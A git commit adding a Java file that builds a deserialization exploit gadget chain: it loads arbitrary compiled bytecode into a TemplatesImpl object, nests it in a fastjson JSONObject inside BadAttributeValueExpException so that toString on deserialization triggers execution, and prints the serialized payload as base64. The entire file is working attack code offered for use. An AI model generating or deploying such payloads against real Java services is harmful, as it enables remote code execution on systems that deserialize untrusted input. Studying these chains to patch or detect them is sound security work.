0f1a23fb29f3294d44ca3d195483aceab5459b64
Zer0peach <113846577+Zer0peach@users.noreply.github.com>
2023-09-25 22:13:06 +0800

    Create BadAttriubutexxxx的toString触发fastjson#toString.java

---
+++ fastjson/BadAttriubutexxxx的toString触发fastjson#toString.java
@@ -0,0 +1,62 @@
+import com.alibaba.fastjson.JSONObject;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xpath.internal.objects.XString;
+import org.springframework.aop.target.HotSwappableTargetSource;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+import java.util.HashMap;
+
+public class exp {
+    public static void main(String[] args) throws Exception {
+        TemplatesImpl templatesimpl = new TemplatesImpl();
+
+        byte[] bytecodes = Files.readAllBytes(Paths.get("C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class"));
+
+        setValue(templatesimpl,"_name","aaa");
+        setValue(templatesimpl,"_bytecodes",new byte[][] {bytecodes});
+        setValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());
+
+        JSONObject jo = new JSONObject();
+        jo.put("1",templatesimpl);
+        BadAttributeValueExpException exp = new BadAttributeValueExpException(1);
+        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
+        val.setAccessible(true);
+        val.set(exp,jo);
+        System.out.println(serial(exp));
+
+    }
+
+    public static String serial(Object o) throws IOException {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(o);
+        oos.close();
+
+        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
+        return base64String;
+
+    }
+
+    public static void deserial(String data) throws Exception {
+        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
+        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
+        CustomObjectInputStream ois = new CustomObjectInputStream(bais);
+        ois.readObject();
+        ois.close();
+    }
+
+    public static void setValue(Object obj, String name, Object value) throws Exception{
+        Field field = obj.getClass().getDeclaredField(name);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+}
